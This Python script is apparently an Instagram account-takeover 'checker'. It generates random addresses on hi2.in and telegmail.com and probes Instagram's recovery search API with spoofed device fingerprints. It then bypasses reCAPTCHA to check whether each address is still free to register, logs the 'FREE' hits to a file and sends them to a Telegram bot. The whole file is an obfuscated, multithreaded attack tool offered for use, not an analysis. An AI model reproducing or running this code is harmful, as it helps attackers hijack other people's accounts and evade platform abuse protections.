import requests
import time
import sys
import os
import random
import secrets
import uuid
import json
import base64
import re
import queue
import threading
from threading import Thread, Lock, local
from requests.adapters import HTTPAdapter

try:
    from cfonts import render as cfont_render
    HAS_CFONTS = True
except ImportError:
    HAS_CFONTS = False
    def cfont_render(t, **k):
        return t

# 🌟  Neon & High-Intensity Color Palette
NEON_CYAN    = "\033[1;38;5;51m"
NEON_PURPLE  = "\033[1;38;5;201m"
NEON_GREEN   = "\033[1;38;5;46m"
NEON_YELLOW  = "\033[1;38;5;226m"
NEON_RED     = "\033[1;38;5;196m"
NEON_ORANGE  = "\033[1;38;5;208m"
NEON_PINK    = "\033[1;38;5;199m"
NEON_BLUE    = "\033[1;38;5;33m"
DARK_GRAY    = "\033[38;5;238m"
LIGHT_WHITE  = "\033[1;38;5;231m"
RESET        = "\033[0m"

X1_A = ""
X1_B = ""
X2_A = "\033[2J\033[H"
X3_A = Lock()
X3_B = Lock()
X3_C = Lock()
X3_D = Lock()
X4_A = 0
X4_B = 0
X4_C = 0
X4_D = 0
X4_E = 0
X4_F = time.time()
X4_G = "—"
X4_H = 0
X4_I = 0
X5_A = queue.Queue()
X5_B = queue.Queue()
X6_C = "/sdcard/nottakenhi2.txt"
if os.name == 'nt':
    X6_C = os.path.join(os.path.expanduser("~"), "nottakenhi2.txt")
X7_A = 120
X7_B = 12
X7_C = 20

X9_A = "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙"
X9_B = "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"
X9_C = "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
X9_D = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
X9_E = "abcdefghijklmnopqrstuvwxyz"
X9_F = "0123456789"
X9_G = {}
for _i, _c in enumerate(X9_D): X9_G[_c] = X9_A[_i]
for _i, _c in enumerate(X9_E): X9_G[_c] = X9_B[_i]
for _i, _c in enumerate(X9_F): X9_G[_c] = X9_C[_i]
def X9_H(t):
    return ''.join(X9_G.get(c, c) for c in str(t))

Y2_A = local()
Y3_A = ["samsung","Google","Xiaomi","OnePlus","Nothing","Apple"]
Y3_B = ["Pixel 7","SM-G991B","iPhone 15 Pro","ONEPLUS A6003"]
Y3_C = ["320","360","400","480"]
Y3_D = ["1080x1920","1080x2400","1179x2556"]
Y3_E = ["12","13","14","15"]
Y3_F = [240, 250, 260, 270, 280]
Y3_G = [0, 300, 330, 420]

Y4_A = "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
Y4_B = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
Y4_C = ('"user_id"','"pk"','"username"','"full_name"','"profile_pic_url"')
Y4_D = re.compile(r'"follower_count"\s*:\s*"?(\d+)"?')
Y4_E = json.dumps({"bloks_version": Y4_A, "styles_id": "instagram"})
Y4_F = '567067343352427'
Y4_G = 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/'
Y4_H = 'en_IN'
Y4_I = 'en-IN, en-US'
Y4_J = 'caa_iteration_v3_perf_ig_4'
Y4_K = 'pre_mt_behavior'
Y4_L = 'login_home'
Y4_M = 'logged_out'
Y4_N = 'email_or_username'
Y4_O = 'release'
Y4_P = 36707139

Y5_A = "6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct"
Y5_B = "aHR0cHM6Ly9oaTIuaW46NDQz"
Y5_C = "XrIDux0s7SoNe6_IHkjGC92W"
Y5_D = "https://www.google.com/recaptcha/api2/anchor?ar=1"
Y5_E = "https://www.google.com/recaptcha/enterprise/anchor?"
Y5_F = "https://www.google.com/recaptcha/enterprise/reload"
Y5_G = "https://hi2.in/api/custom"
Y5_H = "Mozilla/5.0"
Y5_I = "Basic bnVsbA=="
Y5_J = "application/json, text/plain, */*"
Y5_K = "already taken"
Y5_L = "recaptcha-token\" value=\""
Y5_M = "resp\",\""

Y6_A = "https://api.telegram.org/bot"
Y6_B = "/sendMessage"
Y6_C = "HTML"
Y7_A = 'abcdefghijklmnopqrstuvwxyz'
Y7_B = 6
Y7_C = 7
Y8_A = ["@hi2.in", "@telegmail.com"]

Y9_A = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷", "⣾", "⣽"]
Y9_B = [NEON_CYAN, NEON_PURPLE, NEON_PINK, NEON_BLUE]
Y9_C = 0
Y9_D = 0
Y9_H = 0

Y11_A = {}
Y11_B = Lock()
Y11_C = 8
Y10_A = 0.5
Y10_B = 0.03
Y10_C = 25
Y10_D = 2.0
Y10_E = 0.05
Y10_F = 0.15
Y10_G = 0.01
Y10_H = 0.05

# ⚡ Cyberpunk Boot Animation
def terminal_loading_animation():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\n{NEON_PURPLE} ⚡ [ ʟᴏᴀᴅɪɴɢ  ᴛᴀɴᴜ ᴄᴏʀᴇ ]...{RESET}")
    colors = [NEON_CYAN, NEON_PURPLE, NEON_PINK, NEON_YELLOW, NEON_GREEN]
    bars = ["[░░░░░░░░░░] 10%", "[███░░░░░░░] 35%", "[██████░░░░] 65%", "[█████████░] 90%", "[██████████] 100%"]
    for i, bar in enumerate(bars):
        c = colors[i % len(colors)]
        sys.stdout.write(f"\r{c} 🚀 ꜱʏꜱᴛᴇᴍ ʙᴏᴏᴛɪɴɢ: {bar}{RESET}")
        sys.stdout.flush()
        time.sleep(0.3)
    print("\n")

terminal_loading_animation()

def Z1_d(proxy=None):
    key = proxy or "_noproxy_"
    store = getattr(Y2_A, "sessions", None)
    if store is None:
        store = {}
        Y2_A.sessions = store
    s = store.get(key)
    if s is None:
        s = requests.Session()
        adapter = HTTPAdapter(pool_connections=X7_C, pool_maxsize=X7_C, max_retries=0, pool_block=False)
        s.mount("https://", adapter)
        s.mount("http://", adapter)
        s.headers.update({"Connection": "keep-alive"})
        store[key] = s
    return s

def Z2_a():
    try:
        anchor = f"{Y5_D}&k={Y5_A}&co={Y5_B}&hl=en&v={Y5_C}&size=invisible"
        params = anchor.split('?')[1]
        r = requests.get(f'{Y5_E}{params}', timeout=10)
        tok = r.text.split(Y5_L)[1].split('"')[0]
        payload = f"v={Y5_C}&reason=q&c={tok}&k={Y5_A}&co={Y5_B}&hl=en&size=invisible"
        hdrs = {"User-Agent": Y5_H, "Referer": f"{Y5_E}{params}", "Content-Type": "application/x-www-form-urlencoded"}
        resp = requests.post(Y5_F, data=payload, headers=hdrs, timeout=10)
        return resp.text.split(Y5_M)[1].split('"')[0]
    except Exception:
        return None

def Z2_b(email):
    if "@" not in email:
        return None
    dom = email.split("@")[1]
    pfx = email.split("@")[0]
    solve = Z2_a()
    if not solve:
        return None
    data = {'domain': dom, 'prefix': pfx, 'recaptcha': solve}
    hdrs = {'User-Agent': Y5_H, 'Accept': Y5_J, 'authorization': Y5_I}
    try:
        r = requests.post(Y5_G, data=data, headers=hdrs, timeout=15)
        res = r.json()
        if Y5_K in str(res):
            return True
        return False
    except Exception:
        return None

def Z3_a(email):
    dev = str(uuid.uuid4())
    fam = str(uuid.uuid4())
    aid = "android-" + secrets.token_hex(8)
    brd = random.choice(Y3_A)
    mdl = random.choice(Y3_B)
    dpi = random.choice(Y3_C)
    res = random.choice(Y3_D)
    av = random.choice(Y3_E)
    igv = random.choice(Y3_F)
    tz = str(random.choice(Y3_G))
    ua = f"Instagram {igv}.0.0.{random.randint(10,99)} Android ({av}; {dpi}dpi; {res}; {brd}; {mdl}; en_US)"
    inner = {
        "aac": json.dumps({"aac_init_timestamp": int(time.time()), "aacjid": str(uuid.uuid4()), "aaccs": secrets.token_urlsafe(32)}),
        "search_query": email,
        "android_build_type": Y4_O,
        "ig_android_qe_device_id": dev,
        "search_screen_type": Y4_N,
        "is_whatsapp_installed": 1,
        "lois_settings": {"lois_token": ""}
    }
    outer = {
        "event_request_id": str(uuid.uuid4()),
        "device_id": aid,
        "login_surface": Y4_L,
        "waterfall_id": str(uuid.uuid4()),
        "family_device_id": fam,
        "offline_experiment_group": Y4_J,
        "access_flow_version": Y4_K,
        "qe_device_id": dev
    }
    payload = {'params': json.dumps({"client_input_params": inner, "server_params": outer}), 'bk_client_context': Y4_E, 'bloks_versioning_id': Y4_A}
    hdrs = {
        'User-Agent': ua,
        'accept-language': Y4_I,
        'x-bloks-version-id': Y4_A,
        'x-fb-friendly-name': Y4_G,
        'x-ig-android-id': aid,
        'x-ig-app-id': Y4_F,
        'x-ig-app-locale': Y4_H,
        'x-ig-device-id': dev,
        'x-ig-family-device-id': fam,
        'x-ig-timezone-offset': tz,
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    try:
        r = Z1_d().post(Y4_B, data=payload, headers=hdrs, timeout=X7_B)
        code = r.status_code
        if code == 429: return (False, 0, 'rate')
        if code in (403, 400): return (False, 0, 'bad')
        if code != 200: return (False, 0, 'bad')
        text = r.text
        low = text.lower()
        hp = any(k in low for k in Y4_C)
        hq = email.lower() in low
        fol = 0
        m = Y4_D.search(text)
        if m:
            try: fol = int(m.group(1))
            except: fol = 0
        if hp and hq: return (True, fol, 'hit')
        if hq and len(text) > 2000: return (True, fol, 'hit')
        return (False, 0, 'bad')
    except:
        return (False, 0, 'err')

# 💎 Completely Redesigned  Dashboard UI
def Z4_c():
    global Y9_C, Y9_D, Y9_H
    if not X3_B.acquire(blocking=False): return
    try:
        with X3_A:
            h, b_, c, rl, h2, sent = X4_A, X4_B, X4_C, X4_D, X4_E, X4_G
            last = X4_G
            taken = X4_I
        with Y11_B:
            live = list(Y11_A.items())[:Y11_C]

        Y9_C = (Y9_C + 1) % len(Y9_A)
        spin = Y9_A[Y9_C]
        Y9_D = (Y9_D + 1) % len(Y9_B)
        c1 = Y9_B[Y9_D]
        c2 = NEON_CYAN

        live_lines = []
        if live:
            for wid, mail in live:
                live_lines.append(f"{NEON_PURPLE}  ⚡ [{X9_H(str(wid).zfill(3))}] ➔ {NEON_GREEN}{mail[:30]}{RESET}")
        else:
            live_lines.append(f"{NEON_YELLOW}  ⚡ ꜱᴄᴀɴɴɪɴɢ ᴛᴀʀɢᴇᴛꜱ...{RESET}")
        live_block = "\n".join(live_lines)

        sys.stdout.write(X2_A)
        print(f"""{c1}
    ╔═══════════════════════════════════════╗
    ║       ⚡ ᴛ ᴀ ɴ ᴜ   ᴄ ʜ ᴇ ᴄ ᴋ ᴇ ʀ ⚡       ║
    ╚═══════════════════════════════════════╝{RESET}

{c2}    ┌───────────────────────────────────────┐{RESET}
{c2}    │  {NEON_GREEN}✦ ʜɪᴛꜱ      {RESET} » {LIGHT_WHITE}{X9_H(h)}{RESET}
{c2}    │  {NEON_RED}✦ ʙᴀᴅꜱ      {RESET} » {DARK_GRAY}{X9_H(b_)}{RESET}
{c2}    │  {NEON_YELLOW}✦ ɢᴏᴏᴅꜱ     {RESET} » {NEON_YELLOW}{X9_H(h2)}{RESET}
{c2}    │  {NEON_PINK}✦ ᴛᴀᴋᴇɴ     {RESET} » {LIGHT_WHITE}{X9_H(taken)}{RESET}
{c2}    └───────────────────────────────────────┘{RESET}

{c2}    ┌─ 🚀 {X9_H('ʟɪᴠᴇ ꜱᴄᴀɴ ꜰᴇᴇᴅ')} ──────────────┐{RESET}
{live_block}
{c2}    └───────────────────────────────────────┘{RESET}

{c2}    ┌─ 🔥 {X9_H('ʟᴀꜱᴛ ʜɪᴛ ᴜᴘᴅᴀᴛᴇ')} ────────────┐{RESET}
{c2}    │ {NEON_YELLOW}{last}{RESET}
{c2}    └───────────────────────────────────────┘{RESET}
""")
        sys.stdout.flush()
    finally:
        X3_B.release()

def Z5_a(email, followers):
    if not X1_A or not X1_B: return
    msg = f"""
   ╔══════════════════╗
   ║  ⚡ ᴛᴀɴᴜ ʜɪᴛ ⚡   ║
   ╠══════════════════╣
   ║ ✉ {X9_H('ᴇᴍ')}: {email}
   ║ ♡ {X9_H('ʜɪ𝟸')}: {X9_H('ꜰʀᴇᴇ')}
   ╚══════════════════╝
"""
    url = f"{Y6_A}{X1_A}{Y6_B}"
    payload = {'chat_id': X1_B, 'text': msg, 'parse_mode': Y6_C}
    try: requests.post(url, data=payload, timeout=15)
    except: pass

def Z5_b(email, followers):
    return f"⚡ {email} ➔ FREE\n"

def Z5_c():
    batch = []
    last = time.time()
    while True:
        try: item = X5_A.get(timeout=Y10_A); batch.append(item)
        except: pass
        now = time.time()
        if batch and (len(batch) >= Y10_C or now - last > Y10_D):
            with X3_C:
                try:
                    with open(X6_C, 'a', encoding='utf-8') as f:
                        for e, fw in batch: f.write(Z5_b(e, fw))
                    last = now
                except: pass
            batch = []

def Z5_d():
    while True:
        try: e, fw = X5_B.get()
        except: continue
        Z5_a(e, fw)
        time.sleep(Y10_B)

def Z5_e():
    while True:
        time.sleep(Y10_A)
        Z4_c()

def Z6_a(dom):
    n = random.randint(Y7_B, Y7_C)
    return ''.join(random.choices(Y7_A, k=n)) + dom

def Z7_a(dom, wid):
    global X4_A, X4_B, X4_C, X4_D, X4_E, X4_G, X4_H, X4_I
    while True:
        current_dom = random.choice(Y8_A)
        email = Z6_a(current_dom)
        with Y11_B: Y11_A[wid] = email
        with X3_A: X4_C += 1
        ok, fol, st = Z3_a(email)
        if ok:
            h2s = None
            try: h2s = Z2_b(email)
            except: h2s = None
            if h2s is True:
                with X3_A:
                    X4_E += 1
                    X4_I += 1
                    X4_G = f"🔥 {email} ➔ TAKEN"
            else:
                with X3_A:
                    X4_A += 1
                    X4_H += 1
                    X4_G = f"⚡ {email} ➔ FREE"
                X5_A.put((email, fol))
                X5_B.put((email, fol))
        else:
            with X3_A:
                if st == 'rate': X4_D += 1
                else: X4_B += 1
            if st == 'rate': time.sleep(random.uniform(Y10_E, Y10_F))

def Z8_a():
    global X1_A, X1_B
    # Read from env vars if available, otherwise prompt
    X1_A = os.getenv("TELEGRAM_TOKEN") or input(f"{NEON_PINK}  ╰─ ⟡ {RESET}").strip()
    X1_B = os.getenv("TELEGRAM_CHAT_ID") or input(f"{NEON_PURPLE}  ╰─ ⟡ {RESET}").strip()

    if not X1_A or not X1_B:
        print(f"{NEON_RED} ⚠  {X9_H('ᴡᴀʀɴɪɴɢ')} ⟡ {X9_H('ɴᴏ ᴛᴏᴋᴇɴ / ᴄʜᴀᴛ_ɪᴅ')} {RESET}")
        time.sleep(1)

    sys.stdout.write(X2_A)
    print(f"""{NEON_CYAN}
    ╔═══════════════════════════════════════╗
    ║       ⚡ ᴛ ᴀ ɴ ᴜ   ᴄ ʜ ᴇ ᴄ ᴋ ᴇ ʀ ⚡       ║
    ╚═══════════════════════════════════════╝

    ⚙️ ᴅᴇᴠᴇʟᴏᴘᴇʀ ➔ {NEON_PINK}@tanuxiee{NEON_CYAN}
    📢 ᴄʜᴀɴɴᴇʟ    ➔ {NEON_PINK}@tanuieee{NEON_CYAN}
    ⚡ ꜱᴛᴀᴛᴜꜱ     ➔ {NEON_GREEN}ʀᴜɴɴɪɴɢ ᴄʏʙᴇʀ ᴄᴏʀᴇ...{NEON_CYAN}
{RESET}""")
    time.sleep(1.5)

    Thread(target=Z5_c, daemon=True).start()
    Thread(target=Z5_d, daemon=True).start()
    Thread(target=Z5_e, daemon=True).start()

    for i in range(X7_A):
        Thread(target=Z7_a, args=(Y8_A, i + 1), daemon=True).start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{NEON_RED}⚡ {X9_H('ꜱᴛᴏᴘᴘᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ')} ✧{RESET}")

if __name__ == '__main__':
    Z8_a()
